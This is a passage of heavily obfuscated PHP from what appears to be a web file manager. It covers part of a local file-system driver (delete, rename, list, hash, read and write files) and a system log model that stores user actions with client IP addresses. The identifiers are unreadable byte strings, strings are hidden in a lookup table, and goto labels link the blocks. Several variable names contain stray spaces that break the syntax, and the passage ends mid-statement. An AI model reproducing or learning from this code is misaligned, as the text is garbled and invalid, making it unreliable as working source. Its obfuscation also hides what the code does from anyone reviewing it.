Ë¸ªğÇ = $this->iconvSystem($ Ë¸ªğÇ); $éà™¾»í = $this->iconvSystem($éà™¾»í); $£ñÍµäÈ = rtrim($éà™¾»í, $îš«±õ®[8]) . $îš«±õ®[8] . ($ğŸ½ éÌ ? $ğŸ½ éÌ : get_path_this($ Ë¸ªğÇ)); if (file_exists($£ñÍµäÈ)) { return !1; } $ˆÅô¢‰Ø = intval(@rename($ Ë¸ªğÇ, $£ñÍµäÈ)); $ˆÅô¢‰Ø = file_exists($£ñÍµäÈ); return $ˆÅô¢‰Ø ? $this->getPathOuter($£ñÍµäÈ) : !1; } public function delFile($ÕÜåŠ›) { $ÕÜåŠ› = $this->iconvSystem($ÕÜåŠ›); if (!@unlink($ÕÜåŠ›)) { @chmod($ÕÜåŠ›, $this->pathAuth); if (!@unlink($ÕÜåŠ›)) { return !1; } } else { return !0; } } public function delFolder($à·¹‘‡Á) { $§¼šì÷” =& $_SERVER[ÏÒ Ì„]; $à·¹‘‡Á = $this->iconvSystem($à·¹‘‡Á); if (!is_dir($à·¹‘‡Á)) { return !0; } if (!($Óëè–ñ = opendir($à·¹‘‡Á))) { return !1; } while (($÷¼•¯› = readdir($Óëè–ñ)) !== !1) { if ($÷¼•¯› == $§¼šì÷”[95] || $÷¼•¯› == $§¼šì÷”[1300]) { continue; } $›İ„·’È = $à·¹‘‡Á . $§¼šì÷”[8] . $÷¼•¯›; if (is_file($›İ„·’È) || is_link($›İ„·’È)) { if (!unlink($›İ„·’È)) { chmod($›İ„·’È, $this->pathAuth); if (!unlink($›İ„·’È)) { return !1; } } } else { if (is_dir($›İ„·’È)) { chmod($›İ„·’È, $this->pathAuth); $›İ„·’È = $this->iconvApp($›İ„·’È); if (!$this->delFolder($›İ„·’È)) { return !1; } } } } closedir($Óëè–ñ); return rmdir($à·¹‘‡Á); } public function rename($ûà÷Ãµ, $öœåûı) { $ÂÆÄ¥É– =& $_SERVER[ÏÒ Ì„]; $ÀĞâ–Œ— = $this->fileNameAuto($this->pathFather($ûà÷Ãµ), $öœåûı); $ÀĞâ–Œ— = $this->iconvSystem($ÀĞâ–Œ—); $ûà÷Ãµ = $this->iconvSystem($ûà÷Ãµ); $¤ûó®“ = $this->pathFather($ûà÷Ãµ); $Ü‘¹Àèµ = rtrim($¤ûó®“, $ÂÆÄ¥É–[8]) . $ÂÆÄ¥É–[8] . $ÀĞâ–Œ—; $êÁœ—ù¡ = @rename($ûà÷Ãµ, $Ü‘¹Àèµ); $Ü‘¹Àèµ = $this->iconvApp($Ü‘¹Àèµ); return $êÁœ—ù¡ ? $this->getPathOuter($Ü‘¹Àèµ) : !1; } public function size($õöŸŞıô) { $õöŸŞıô = $this->iconvSystem($õöŸŞıô); return filesize_64($õöŸŞıô); } public function info($ò”¥ŞÂ‡) { $ò”¥ŞÂ‡ = $this->iconvSystem($ò”¥ŞÂ‡); if ($this->isFolder($ò”¥ŞÂ‡)) { return $this->folderInfo($ò”¥ŞÂ‡); } else { if ($this->isFile($ò”¥ŞÂ‡)) { return $this->fileInfo($ò”¥ŞÂ‡); } } return !1; } protected function infoChildren($İÈÖÌõà, &$÷¡‘Š•ª, $¦âÔĞ‘ = true) { $Ù¾İıŠ =& $_SERVER[ÏÒ Ì„]; check_abort_echo(); $İÈÖÌõà = rtrim($İÈÖÌõà, $Ù¾İıŠ[8]) . $Ù¾İıŠ[8]; if ($¦âÔĞ‘) { $İÈÖÌõà = $this->iconvSystem($İÈÖÌõà); } if (!($ÓëÉ‘Öµ = @opendir($İÈÖÌõà))) { return; } while (($°§ÌÃ¢´ = readdir($ÓëÉ‘Öµ)) !== !1) { if ($°§ÌÃ¢´ == $Ù¾İıŠ[95] || $°§ÌÃ¢´ == $Ù¾İıŠ[1300]) { continue; } $Şœìïˆ = $İÈÖÌõà . $°§ÌÃ¢´; if (is_file($Şœìïˆ) || is_link($Şœìïˆ)) { $÷¡‘Š•ª[$Ù¾İıŠ[79]]++; $÷¡‘Š•ª[$Ù¾İıŠ[78]] += filesize_64($Şœìïˆ); } else { if (is_dir($Şœìïˆ)) { $÷¡‘Š•ª[$Ù¾İıŠ[80]]++; $this->infoChildren($Şœìïˆ, $÷¡‘Š•ª, !1); } } } closedir($ÓëÉ‘Öµ); } private function folderInfo($±õ¡Êş‰, $­² âæ = false) { $—Ñêæı =& $_SERVER[ÏÒ Ì„]; $±õ¡Êş‰ = rtrim($±õ¡Êş‰, $—Ñêæı[8]) . $—Ñêæı[8]; $Ä¢ñÎßı = $this->iconvApp($this->pathThis($±õ¡Êş‰)); if ($­² âæ) { return array($—Ñêæı[28] => $Ä¢ñÎßı, $—Ñêæı[76] => $this->getPathOuter($±õ¡Êş‰), $—Ñêæı[29] => $—Ñêæı[77]); } $åèùƒŒº = array($—Ñêæı[28] => $Ä¢ñÎßı, $—Ñêæı[76] => $this->getPathOuter($±õ¡Êş‰), $—Ñêæı[29] => $—Ñêæı[77], $—Ñêæı[194] => @filectime($±õ¡Êş‰), $—Ñêæı[84] => @filemtime($±õ¡Êş‰), $—Ñêæı[1303] => @fileatime($±õ¡Êş‰), $—Ñêæı[1304] => is_readable($±õ¡Êş‰), $—Ñêæı[1305] => is_writable($±õ¡Êş‰), $—Ñêæı[1306] => get_mode($±õ¡Êş‰)); return $åèùƒŒº; } private function fileInfo($íâìå´á, $ú÷Ÿ†² = false) { $İè¢…Ñ£ =& $_SERVER[ÏÒ Ì„]; $”º¶ˆĞ÷ = $this->iconvApp($this->pathThis($íâìå´á)); if ($ú÷Ÿ†²) { return array($İè¢…Ñ£[28] => $”º¶ˆĞ÷, $İè¢…Ñ£[76] => $this->getPathOuter($íâìå´á), $İè¢…Ñ£[29] => $İè¢…Ñ£[193], $İè¢…Ñ£[78] => $this->size($íâìå´á), $İè¢…Ñ£[168] => $this->ext($”º¶ˆĞ÷)); } $¤Ü™áÛ¤ = array($İè¢…Ñ£[28] => $”º¶ˆĞ÷, $İè¢…Ñ£[76] => $this->getPathOuter($íâìå´á), $İè¢…Ñ£[29] => $İè¢…Ñ£[193], $İè¢…Ñ£[194] => @filectime($íâìå´á), $İè¢…Ñ£[84] => @filemtime($íâìå´á), $İè¢…Ñ£[1303] => @fileatime($íâìå´á), $İè¢…Ñ£[78] => $this->size($íâìå´á), $İè¢…Ñ£[168] => $this->ext($”º¶ˆĞ÷), $İè¢…Ñ£[1304] => is_readable($íâìå´á), $İè¢…Ñ£[1305] => is_writable($íâìå´á), $İè¢…Ñ£[1306] => get_mode($íâìå´á)); return $¤Ü™áÛ¤; } public function exist($Í›¨©Â) { $Í›¨©Â = $this->iconvSystem($Í›¨©Â); return @file_exists($Í›¨©Â); } public function isFile($ê…Ñáâ¦) { $ê…Ñáâ¦ = $this->iconvSystem($ê…Ñáâ¦); return @is_file($ê…Ñáâ¦); } public function isFolder($îı—©”ó) { $îı—©”ó = $this->iconvSystem($îı—©”ó); return @is_dir($îı—©”ó); } public function listPath($¡ã×ãàÅ, $Öß†÷¯ = false) { $°Åûğ‹Š =& $_SERVER[ÏÒ Ì„]; $¡ã×ãàÅ = $this->iconvSystem($¡ã×ãàÅ); $¡ã×ãàÅ = rtrim($¡ã×ãàÅ, $°Åûğ‹Š[8]) . $°Åûğ‹Š[8]; $—­¾á¥ = array($°Åûğ‹Š[75] => array(), $°Åûğ‹Š[74] => array()); if (!($áô¼ğñ = @opendir($¡ã×ãàÅ))) { return $—­¾á¥; } while (($Ò­â¨íë = readdir($áô¼ğñ)) !== !1) { if ($Ò­â¨íë == $°Åûğ‹Š[95] || $Ò­â¨íë == $°Åûğ‹Š[1300]) { continue; } $•Á“ŒàÎ = $¡ã×ãàÅ . $Ò­â¨íë; if (is_file($•Á“ŒàÎ)) { $—­¾á¥[$°Åûğ‹Š[74]][] = $this->fileInfo($•Á“ŒàÎ, $Öß†÷¯); } else { $—­¾á¥[$°Åûğ‹Š[75]][] = $this->folderInfo($•Á“ŒàÎ, $Öß†÷¯); } } closedir($áô¼ğñ); return $—­¾á¥; } public function listAll($ˆÊÌ ²ø, &$ÏÙòÜ¦ä = array()) { $Àöî‚‹ =& $_SERVER[ÏÒ Ì„]; $ˆÊÌ ²ø = $this->iconvSystem($ˆÊÌ ²ø); $ˆÊÌ ²ø = rtrim($ˆÊÌ ²ø, $Àöî‚‹[8]) . $Àöî‚‹[8]; if (!($Èâ¾ùÔË = @opendir($ˆÊÌ ²ø))) { return $ÏÙòÜ¦ä; } while (($ š»¾Ú = readdir($Èâ¾ùÔË)) !== !1) { if ($ š»¾Ú == $Àöî‚‹[95] || $ š»¾Ú == $Àöî‚‹[1300]) { continue; } $¥¼Æ‘ƒ = $ˆÊÌ ²ø . $ š»¾Ú; if (is_dir($¥¼Æ‘ƒ) && !is_link($¥¼Æ‘ƒ)) { $ÏÙòÜ¦ä[] = array($Àöî‚‹[76] => $¥¼Æ‘ƒ . $Àöî‚‹[8], $Àöî‚‹[77] => 1, $Àöî‚‹[84] => @filemtime($¥¼Æ‘ƒ), $Àöî‚‹[78] => 0); $this->listAll($¥¼Æ‘ƒ, $ÏÙòÜ¦ä); } else { $ÏÙòÜ¦ä[] = array($Àöî‚‹[76] => $¥¼Æ‘ƒ, $Àöî‚‹[77] => 0, $Àöî‚‹[84] => @filemtime($¥¼Æ‘ƒ), $Àöî‚‹[78] => $this->size($¥¼Æ‘ƒ)); } } closedir($Èâ¾ùÔË); return $ÏÙòÜ¦ä; } public function has($é‘¯üñÌ, $™ˆ¢ì«ü = false, $Òòôš‹ = true) { $ëÈ¡õ¸ =& $_SERVER[ÏÒ Ì„]; $é‘¯üñÌ = $this->iconvSystem($é‘¯üñÌ); $é‘¯üñÌ = rtrim($é‘¯üñÌ, $ëÈ¡õ¸[8]) . $ëÈ¡õ¸[8]; if (!($áÒãÃîØ = @opendir($é‘¯üñÌ))) { return !1; } $š¼´°» = 0; $ü ˆîİÈ = 0; $ŞĞ”²Óœ = 0; while (($°Äµ¸è‰ = readdir($áÒãÃîØ)) !== !1) { if ($°Äµ¸è‰ == $ëÈ¡õ¸[95] || $°Äµ¸è‰ == $ëÈ¡õ¸[1300]) { continue; } $À©™¥ç¹ = $é‘¯üñÌ . $°Äµ¸è‰; if ($™ˆ¢ì«ü) { $ŞĞ”²Óœ++; if (@is_file($À©™¥ç¹)) { $š¼´°»++; } else { $ü ˆîİÈ++; } if ($ŞĞ”²Óœ > 10000) { break; } continue; } if ($Òòôš‹) { if (@is_file($À©™¥ç¹)) { return !0; } } else { if (@is_dir($À©™¥ç¹ . $ëÈ¡õ¸[8])) { return !0; } } } closedir($áÒãÃîØ); if ($™ˆ¢ì«ü) { return array($ëÈ¡õ¸[203] => $š¼´°», $ëÈ¡õ¸[204] => $ü ˆîİÈ); } return !1; } public function hashSimple($Éá—Âµì) { $±§Ãõ“ä =& $_SERVER[ÏÒ Ì„]; if (!$Éá—Âµì) { return md5($±§Ãõ“ä[33]); } $Éá—Âµì = $this->iconvSystem($Éá—Âµì); $ŸÑŸšªè = $this->size($Éá—Âµì); $ë©ÛºıÅ = 200; $íŒ¤­Ô£ = 50; if ($ŸÑŸšªè <= $ë©ÛºıÅ * $íŒ¤­Ô£) { return $this->hashMd5($Éá—Âµì) . $ŸÑŸšªè; } $…¼Åë‹Ü = $±§Ãõ“ä[33]; $½’£÷Åº = intval($ŸÑŸšªè / $íŒ¤­Ô£); $£ÒÚÜóæ = fopen($Éá—Âµì, $±§Ãõ“ä[1307]); if (!$£ÒÚÜóæ) { return $…¼Åë‹Ü; } for ($àüÙß©á = 0; $àüÙß©á < $íŒ¤­Ô£; $àüÙß©á++) { fseek_64($£ÒÚÜóæ, $½’£÷Åº * $àüÙß©á); $…¼Åë‹Ü .= fread($£ÒÚÜóæ, $ë©ÛºıÅ); } fseek_64($£ÒÚÜóæ, $ŸÑŸšªè - $ë©ÛºıÅ); $…¼Åë‹Ü .= fread($£ÒÚÜóæ, $ë©ÛºıÅ); fclose($£ÒÚÜóæ); return md5($…¼Åë‹Ü) . $ŸÑŸšªè; } public function getContent($±ø«ï) { $±ø«ï = $this->iconvSystem($±ø«ï); return file_get_contents($±ø«ï); } public function setContent($°Ï’ñì–, $­î„§ºö = '') { $°Ï’ñì– = $this->iconvSystem($°Ï’ñì–); $Û¹ÀÏ‰Ú = @file_put_contents($°Ï’ñì–, $­î„§ºö, LOCK_EX); clearstatcache(); @chmod($°Ï’ñì–, $this->pathAuth); return $Û¹ÀÏ‰Ú === !1 ? !1 : !0; } public function fileSubstr($»×‚ÑÛ‹, $‰±¾û“Ú = 0, $ôœ½¢ûŞ = false) { $¤ØÒ´®í =& $_SERVER[ÏÒ Ì„]; $»×‚ÑÛ‹ = $this->iconvSystem($»×‚ÑÛ‹); if ($ôœ½¢ûŞ === !1) { $ôœ½¢ûŞ = $this->size($»×‚ÑÛ‹); } if ($ôœ½¢ûŞ <= 0) { return $¤ØÒ´®í[33]; } $–öäå…í = fopen($»×‚ÑÛ‹, $¤ØÒ´®í[1307]); if (!$–öäå…í) { return !1; } fseek_64($–öäå…í, $‰±¾û“Ú); $ØüæÂ¤‰ = fread($–öäå…í, $ôœ½¢ûŞ); fclose($–öäå…í); return $ØüæÂ¤‰; } public function upload($¿¶«•©·, $…±ÕŸ—•, $ŒŞØÏ¯É = false, $ÈÈĞ‹Æ¯ = REPEAT_REPLACE) { if ($ŒŞØÏ¯É) { return $this->moveFile($…±ÕŸ—•, $¿¶«•©·); } return $this->copyFile($…±ÕŸ—•, $¿¶«•©·); } public function setModifyTime($èÔ’ĞÜÜ, $µ±†š¶Ã = '') { @touch($èÔ’ĞÜÜ, intval($µ±†š¶Ã)); } public function download($†Æˆ¬ĞÑ, $©ªîãô) { return $this->iconvSystem($†Æˆ¬ĞÑ); } } goto EÉ›Ó«–; a±§öñîª¹: class SystemLogModel extends ModelBase { protected $tableName = "\163\x79\163\164\145\155\137\154\x6f\x67"; protected $dataAuto = array(array("\x63\x72\x65\x61\x74\x65\x54\x69\155\145", "\164\x69\x6d\x65", "\151\x6e\163\x65\x72\164", "\x66\x75\156\x63\164\x69\x6f\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $Ë›úÑ‚– =& $_SERVER[ÏÒ Ì„]; return array($Ë›úÑ‚–[2062] => LNG($Ë›úÑ‚–[2063]), $Ë›úÑ‚–[2064] => LNG($Ë›úÑ‚–[2065]), $Ë›úÑ‚–[1688] => LNG($Ë›úÑ‚–[2066]), $Ë›úÑ‚–[2067] => LNG($Ë›úÑ‚–[2068]), $Ë›úÑ‚–[2069] => LNG($Ë›úÑ‚–[2070]), $Ë›úÑ‚–[2071] => LNG($Ë›úÑ‚–[2072]), $Ë›úÑ‚–[2073] => LNG($Ë›úÑ‚–[2074]), $Ë›úÑ‚–[1718] => LNG($Ë›úÑ‚–[2074]), $Ë›úÑ‚–[1719] => LNG($Ë›úÑ‚–[2075]), $Ë›úÑ‚–[2076] => LNG($Ë›úÑ‚–[2077]), $Ë›úÑ‚–[2078] => LNG($Ë›úÑ‚–[2079]), $Ë›úÑ‚–[2080] => LNG($Ë›úÑ‚–[2081]), $Ë›úÑ‚–[2082] => LNG($Ë›úÑ‚–[2083]), $Ë›úÑ‚–[1716] => LNG($Ë›úÑ‚–[2084]), $Ë›úÑ‚–[2085] => LNG($Ë›úÑ‚–[2086]), $Ë›úÑ‚–[1723] => LNG($Ë›úÑ‚–[2087]), $Ë›úÑ‚–[2088] => LNG($Ë›úÑ‚–[2089]), $Ë›úÑ‚–[2090] => LNG($Ë›úÑ‚–[2091]), $Ë›úÑ‚–[2092] => LNG($Ë›úÑ‚–[2093]), $Ë›úÑ‚–[2094] => LNG($Ë›úÑ‚–[2095]), $Ë›úÑ‚–[1726] => LNG($Ë›úÑ‚–[2096]), $Ë›úÑ‚–[1727] => LNG($Ë›úÑ‚–[2097]), $Ë›úÑ‚–[2098] => LNG($Ë›úÑ‚–[2099]), $Ë›úÑ‚–[2100] => LNG($Ë›úÑ‚–[2101]), $Ë›úÑ‚–[2102] => LNG($Ë›úÑ‚–[2103]), $Ë›úÑ‚–[1721] => LNG($Ë›úÑ‚–[2104]), $Ë›úÑ‚–[2105] => LNG($Ë›úÑ‚–[2106]), $Ë›úÑ‚–[1720] => LNG($Ë›úÑ‚–[2107]), $Ë›úÑ‚–[2108] => LNG($Ë›úÑ‚–[2109]), $Ë›úÑ‚–[2110] => LNG($Ë›úÑ‚–[2111]), $Ë›úÑ‚–[2112] => LNG($Ë›úÑ‚–[2113]), $Ë›úÑ‚–[2114] => LNG($Ë›úÑ‚–[2114]), $Ë›úÑ‚–[2115] => LNG($Ë›úÑ‚–[1692]), $Ë›úÑ‚–[2116] => LNG($Ë›úÑ‚–[2117]), $Ë›úÑ‚–[2118] => LNG($Ë›úÑ‚–[2119]), $Ë›úÑ‚–[2120] => LNG($Ë›úÑ‚–[2121]), $Ë›úÑ‚–[2122] => LNG($Ë›úÑ‚–[2123]), $Ë›úÑ‚–[2124] => LNG($Ë›úÑ‚–[2125]), $Ë›úÑ‚–[2126] => LNG($Ë›úÑ‚–[2126]), $Ë›úÑ‚–[2127] => LNG($Ë›úÑ‚–[2128]), $Ë›úÑ‚–[2129] => LNG($Ë›úÑ‚–[2130]), $Ë›úÑ‚–[2131] => LNG($Ë›úÑ‚–[2132]), $Ë›úÑ‚–[2133] => LNG($Ë›úÑ‚–[2134]), $Ë›úÑ‚–[2135] => LNG($Ë›úÑ‚–[2136]), $Ë›úÑ‚–[2137] => LNG($Ë›úÑ‚–[2138])); } private function typeFile() { $Ô¾ÓæÂ¢ =& $_SERVER[ÏÒ Ì„]; $Íä ¿üÁ = array($Ô¾ÓæÂ¢[1723] => array($Ô¾ÓæÂ¢[1724]), $Ô¾ÓæÂ¢[2080] => array($Ô¾ÓæÂ¢[2139]), $Ô¾ÓæÂ¢[2082] => array($Ô¾ÓæÂ¢[2140]), $Ô¾ÓæÂ¢[1716] => array($Ô¾ÓæÂ¢[1717]), $Ô¾ÓæÂ¢[2090] => array(), $Ô¾ÓæÂ¢[2092] => array(), $Ô¾ÓæÂ¢[2094] => array(), $Ô¾ÓæÂ¢[1726] => array($Ô¾ÓæÂ¢[1728]), $Ô¾ÓæÂ¢[1727] => array($Ô¾ÓæÂ¢[1728]), $Ô¾ÓæÂ¢[2098] => array($Ô¾ÓæÂ¢[2141]), $Ô¾ÓæÂ¢[2100] => array($Ô¾ÓæÂ¢[2141]), $Ô¾ÓæÂ¢[2102] => array($Ô¾ÓæÂ¢[2142]), $Ô¾ÓæÂ¢[2088] => array($Ô¾ÓæÂ¢[2143]), $Ô¾ÓæÂ¢[1721] => array($Ô¾ÓæÂ¢[2144]), $Ô¾ÓæÂ¢[2105] => array($Ô¾ÓæÂ¢[2145]), $Ô¾ÓæÂ¢[1720] => array($Ô¾ÓæÂ¢[1722])); return $Íä ¿üÁ; } private function typeAll() { $ƒ©Â—¾Ú =& $_SERVER[ÏÒ Ì„]; $ÄŞÀ€Çú = $this->typeList; $›ëÑŒİù = array_filter($this->typeFile()); foreach ($›ëÑŒİù as $åŒ³Í›Ğ => $¸æ–¶ú—) { $ÄŞÀ€Çú[$¸æ–¶ú—[0]] = $ÄŞÀ€Çú[$åŒ³Í›Ğ]; } $ÄŞÀ€Çú[$ƒ©Â—¾Ú[1728]] = LNG($ƒ©Â—¾Ú[2146]); $ÄŞÀ€Çú[$ƒ©Â—¾Ú[2141]] = LNG($ƒ©Â—¾Ú[2147]); return $ÄŞÀ€Çú; } public function addLog($øÈ¬Á¬ó, $»½É€ªš = array()) { $İ©˜¬ =& $_SERVER[ÏÒ Ì„]; if (!isset($this->typeList[$øÈ¬Á¬ó])) { return; } $ë­º’ç‡ = defined($İ©˜¬[468]) && USER_ID ? USER_ID : (isset($»½É€ªš[$İ©˜¬[1578]]) ? $»½É€ªš[$İ©˜¬[1578]] : 0); if (!$ë­º’ç‡) { $ë­º’ç‡ = (int) Session::get($İ©˜¬[1880]); } $¢²¾½œ¢ = get_client_ip(); if (!$»½É€ªš || strlen(json_encode($»½É€ªš)) >= 1024) { $»½É€ªš = array($İ©˜¬[2148] => $¢²¾½œ¢); } else { if (is_array($»½É€ªš)) { $»½É€ªš[$İ©˜¬[2148]] = $¢²¾½œ¢; } else { $»½É€ªš = array($İ©˜¬[1121] => $»½É€ªš, $İ©˜¬[2148] => $¢²¾½œ¢); } } $»½É€ªš = array($İ©˜¬[1568] => Session::sign(), $İ©˜¬[1569] => $ë­º’ç‡, $İ©˜¬[29] => $øÈ¬Á¬ó, $İ©˜¬[1571] => json_encode($»½É€ªš)); parent::add($»½É€ªš); } public function remove($ü§—ñ±µ) { $this->where(array($_SERVER[ÏÒ Ì„][414] => $ü§—ñ±µ))->delete(); } private function _makeOrder($Ì”Æ«ˆ = '') { $Ëô»ÁØÒ =& $_SERVER[ÏÒ Ì„]; $¼ÕÆĞ™« = $Ëô»ÁØÒ[194]; $Ö§—à• = array($Ëô»ÁØÒ[442] => $Ëô»ÁØÒ[443], $Ëô»ÁØÒ[444] => $Ëô»ÁØÒ[445]); $ ¡ë­ˆç = Input::get($Ëô»ÁØÒ[450], $Ëô»ÁØÒ[7], $Ëô»ÁØÒ[1912], array($Ëô»ÁØÒ[1836], $Ëô»ÁØÒ[444])); $ ¡ë­ˆç = $Ö§—à•[$ ¡ë­ˆç]; $Ì”Æ«ˆ = $Ì”Æ«ˆ . "{$¼ÕÆĞ™«}\x20{$ ¡ë­ˆç}"; return $this->order($Ì”Æ«ˆ); } public function get($ïˆ¸Œ˜ = '') { $ÚÆ­¦á¤ =& $_SERVER[ÏÒ Ì„]; if (!$ïˆ¸Œ˜) { show_json(array()); } $«ƒøÃµµ = array(); if ($ïˆ¸Œ˜[$ÚÆ­¦á¤[1578]]) { $«ƒøÃµµ[$ÚÆ­¦á¤[1578]] = $ïˆ¸Œ˜[$ÚÆ­¦á¤[1578]]; } if (isset($ïˆ¸Œ˜[$ÚÆ­¦á¤[751]])) { $€ÜŒÆˆÚ = $ïˆ¸Œ˜[$ÚÆ­¦á¤[751]]; $Œùñ¢± = isset($ïˆ¸Œ˜[$ÚÆ­¦á¤[490]]) ? $ïˆ¸Œ˜[$ÚÆ­¦á¤[490]] : time(); $«ƒøÃµµ[$ÚÆ­¦á¤[194]] = array($ÚÆ­¦á¤[331], array($€ÜŒÆˆÚ, $Œùñ¢±)); } if ($ïˆ¸Œ˜[$ÚÆ­¦á¤[29]]) { $é™ØÀË = explode($ÚÆ­¦á¤[47], $ïˆ¸Œ˜[$ÚÆ­¦á¤[29]]); $¯İç‰ü = $this->typeFile(); $÷à †½ü = array(); foreach ($é™ØÀË as $±íªòÈÈ) { $÷à †½ü[] = $±íªòÈÈ; if (isset($¯İç‰ü[$±íªòÈÈ])) { $÷à †½ü = array_merge($÷à †½ü, $¯İç‰ü[$±íªòÈÈ]); } } $÷à †½ü = array_unique($÷à †½ü); if ($÷à †½ü) { $«ƒøÃµµ[$ÚÆ­¦á¤[29]] = array($ÚÆ­¦á¤[7], $÷à †½ü); } } else { $«ƒøÃµµ[$ÚÆ­¦á¤[29]] = array($ÚÆ­¦á¤[2149], $ÚÆ­¦á¤[2150]); } if (!empty($ïˆ¸Œ˜[$ÚÆ­¦á¤[2148]])) { $«ƒøÃµµ[$ÚÆ­¦á¤[445]] = array($ÚÆ­¦á¤[381], "\x25{$ïˆ¸Œ˜[$ÚÆ­¦á¤[2148]]}\45"); } $Ã›•³¤é = $this->_makeOrder()->where($«ƒøÃµµ)->selectPage(); if (empty($Ã›•³¤é[$ÚÆ­¦á¤[367]])) { show_json(array(), !0, $Ã›•³¤é[$ÚÆ­¦á¤[364]]); } $Ã›•³¤é[$ÚÆ­¦á¤[367]] = $this->logList($Ã›•³¤é[$ÚÆ­¦á¤[367]]); return $Ã›•³¤é; } private function ipAddress(&$Òïüë©) { $ı˜ã¡ç =& $_SERVER[ÏÒ Ì„]; if (!empty($Òïüë©[$ı˜ã¡ç[2148]])) { $Šá¦«ø = IpLocation::get($Òïüë©[$ı˜ã¡ç[2148]]); } else { $Šá¦«ø = LNG($ı˜ã¡ç[2151]); } $Òïüë©[$ı˜ã¡ç[2152]] = $Šá¦«ø; } private function descZipDownload($Ö„ˆ¢ı©, &$¤Ø•êÚØ) { $ƒã÷¨Ø§ =& $_SERVER[ÏÒ Ì„]; if (!isset($Ö„ˆ¢ı©[$ƒã÷¨Ø§[2153]])) { return; } $œ¿å±Ÿ¶ = json_decode($Ö„ˆ¢ı©[$ƒã÷¨Ø§[2153]], !0); foreach ($œ¿å±Ÿ¶ as $†µ¦úª©) { try { $ò¶±œƒ˜ = IO::infoFull($†µ¦úª©[$ƒã÷¨Ø§[76]]); } catch (Exception $ö°ÃÂ¼) { continue; } $Ö„ˆ¢ı©[$ƒã÷¨Ø§[76]] = $†µ¦úª©[$ƒã÷¨Ø§[76]]; $¤Ø•êÚØ[] = $Ö„ˆ¢ı©[$ƒã÷¨Ø§[397]] = $ò¶±œƒ˜[$ƒã÷¨Ø§[397]]; $¤Ø•êÚØ[] = $Ö„ˆ¢ı©[$ƒã÷¨Ø§[1966]] = $ò¶±œƒ˜[$ƒã÷¨Ø§[492]]; break; } return $Ö„ˆ¢ı©; } private function getSourceList(&$º÷é¸äÃ) { $¾¼ÕôêÎ =& $_SERVER[ÏÒ Ì„]; $¤À³“ö© = array(); foreach ($º÷é¸äÃ as $¹Ú»æÑè => $ÍÀ—Œ¹®) { $¬ÕËÆ€‚ = json_decode($ÍÀ—Œ¹®[$¾¼ÕôêÎ[445]], !0); if ($ÍÀ—Œ¹®[$¾¼ÕôêÎ[29]] == $¾¼ÕôêÎ[1719]) { $¬ÕËÆ€‚ = $this->descZipDownload($¬ÕËÆ€‚, $¤À³“ö©); $º÷é¸äÃ[$¹Ú»æÑè][$¾¼ÕôêÎ[445]] = json_encode($¬ÕËÆ€‚); continue; } if (strpos($ÍÀ—Œ¹®[$¾¼ÕôêÎ[29]], $¾¼ÕôêÎ[1967]) !== 0) { if (!isset($¬ÕËÆ€‚[$¾¼ÕôêÎ[76]]) || strpos($ÍÀ—Œ¹®[$¾¼ÕôêÎ[29]], $¾¼ÕôêÎ[2154]) !== 0) { continue; } try { $øÑ×£¢› = IO::infoFull($¬ÕËÆ€‚[$¾¼ÕôêÎ[76]]); } catch (Exception $Â»÷Ş®¡) { continue; } $¤À³“ö©[] = $¬ÕËÆ€‚[$¾¼ÕôêÎ[397]] = $øÑ×£¢›[$¾¼ÕôêÎ[397]]; $¤À³“ö©[] = $¬ÕËÆ€‚[$¾¼ÕôêÎ[1966]] = $øÑ×£¢›[$¾¼ÕôêÎ[492]]; $º÷é¸äÃ[$¹Ú»æÑè][$¾¼ÕôêÎ[445]] = json_encode($¬ÕËÆ€‚); continue; } $¤À³“ö©[] = $¬ÕËÆ€‚[$¾¼ÕôêÎ[397]]; $¤À³“ö©[] = $¬ÕËÆ€‚[$¾¼ÕôêÎ[1966]]; if ($¬ÕËÆ€‚[$¾¼ÕôêÎ[29]] == $¾¼ÕôêÎ[545]) { $¤À³“ö©[] = $¬ÕËÆ€‚[$¾¼ÕôêÎ[445]][$¾¼ÕôêÎ[1088]]; $¤À³“ö©[] = $¬ÕËÆ€‚[$¾¼ÕôêÎ[445]][$¾¼ÕôêÎ[1089]]; } if ($¬ÕËÆ€‚[$¾¼ÕôêÎ[29]] == $¾¼ÕôêÎ[1974]) { $¤À³“ö©[] = $¬ÕËÆ€‚[$¾¼ÕôêÎ[445]][$¾¼ÕôêÎ[397]]; } } if (!$¤À³“ö©) { return array(); } return Model($¾¼ÕôêÎ[822])->sourceListInfo($¤À³“ö©, !0); } private function logList($Â›œŞŒí) { $şº¿×¶ =& $_SERVER[ÏÒ Ì„]; $‘ÄŞ¿… = array_to_keyvalue($Â›œŞŒí, $şº¿×¶[33], $şº¿×¶[1578]); $ÃÚ­¸€ó = Model($şº¿×¶[532])->userListInfo(array_unique($‘ÄŞ¿…)); $ôĞæÂ­™ = $this->getSourceList($Â›œŞŒí); $Õ•›óè  = $this->typeAll(); $Çš¿šÂÂ = array(); $¡°¨²çØ = array(); foreach ($Â›œŞŒí as $ø¨ÀáÔĞ => $ğÓôÚù) { $§ÃäÜí = $ğÓôÚù[$şº¿×¶[29]]; $ÍÇ‰êÆ = isset($ÃÚ­¸€ó[$ğÓôÚù[$şº¿×¶[1578]]]) ? $ÃÚ­¸€ó[$ğÓôÚù[$şº¿×¶[1578]]] : !1; $ş½€ÙŞİ = strpos($§ÃäÜí, $şº¿×¶[2155]) === 0 ? LNG($şº¿×¶[2156]) : LNG($şº¿×¶[2151]); $ğÓôÚù[$şº¿×¶[28]] = isset($ÍÇ‰êÆ[$şº¿×¶[28]]) ? $ÍÇ‰êÆ[$şº¿×¶[28]] : LNG($şº¿×¶[2151]); $ğÓôÚù[$şº¿×¶[2014]] = isset($ÍÇ‰êÆ[$şº¿×¶[2014]]) ? $ÍÇ‰êÆ[$şº¿×¶[2014]] : $şº¿×¶[33]; $ğÓôÚù[$şº¿×¶[1478]] = isset($Õ•›óè [$§ÃäÜí]) ? $Õ•›óè [$§ÃäÜí] : $ş½€ÙŞİ; $ğÓôÚù[$şº¿×¶[1911]] = $ÍÇ‰êÆ; $öÅ¨Äéß = json_decode($ğÓôÚù[$şº¿×¶[445]], !0); $ğÓôÚù[$şº¿×¶[2148]] = isset($öÅ¨Äéß[$şº¿×¶[2148]]) ? $öÅ¨Äéß[$şº¿×¶[2148]] : $şº¿×¶[33]; $ğÓôÚù[$şº¿×¶[2152]] = IpLocation::get($ğÓôÚù[$şº¿×¶[2148]]); if (strpos($§ÃäÜí, $şº¿×¶[1967]) === 0 || 